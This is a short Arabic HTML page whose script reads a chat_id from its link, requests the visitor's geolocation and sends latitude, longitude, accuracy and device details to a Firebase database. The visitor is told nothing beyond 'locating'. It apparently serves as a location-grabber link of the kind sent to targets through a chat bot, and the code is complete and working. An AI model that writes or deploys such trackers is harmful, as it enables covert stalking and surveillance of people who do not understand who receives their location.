<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<title>تحديد الموقع</title>

<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>

<style>
body{
margin:0;
height:100vh;
display:flex;
align-items:center;
justify-content:center;
background:#0d0d0d;
color:#00aaff;
font-family:sans-serif;
text-align:center;
}
</style>
</head>

<body>

<h2 id="status">📍 جاري تحديد الموقع...</h2>

<script>

// قراءة chat_id من الرابط
const params = new URLSearchParams(window.location.search);
const chatId = params.get("chat_id");

if(!chatId){
document.getElementById("status").innerText="⚠ رابط غير صالح";
throw new Error("No chat_id");
}


// Firebase config مأخوذ من google-services.json
const firebaseConfig = {

apiKey: "AIzaSyCuyAgacCs5tClhYD79IVOpSWVvbtXObpc",

authDomain: "hercules-65b0c.firebaseapp.com",

databaseURL: "https://hercules-65b0c-default-rtdb.firebaseio.com",

projectId: "hercules-65b0c",

storageBucket: "hercules-65b0c.firebasestorage.app",

messagingSenderId: "758576632296",

appId: "1:758576632296:android:c69d0667cf54311617d45d"

};

firebase.initializeApp(firebaseConfig);
const database = firebase.database();


// معلومات الجهاز
function getDeviceInfo(){

const ua = navigator.userAgent;

return{

user_agent: ua,
platform: navigator.platform,
language: navigator.language,
screen_width: screen.width,
screen_height: screen.height,
is_mobile: /Android|iPhone|iPad|iPod/i.test(ua)

};

}


// طلب الموقع
navigator.geolocation.getCurrentPosition(

async(pos)=>{

const device = getDeviceInfo();

const data = {

chat_id: chatId,

latitude: pos.coords.latitude,
longitude: pos.coords.longitude,
accuracy: pos.coords.accuracy,

time: new Date().toISOString(),

device: device

};

await database.ref("locations").push(data);

document.getElementById("status").innerText="✅ تم إرسال الموقع";

},

()=>{

document.getElementById("status").innerText="❌ تم رفض إذن الموقع";

}

);

</script>

</body>
</html>
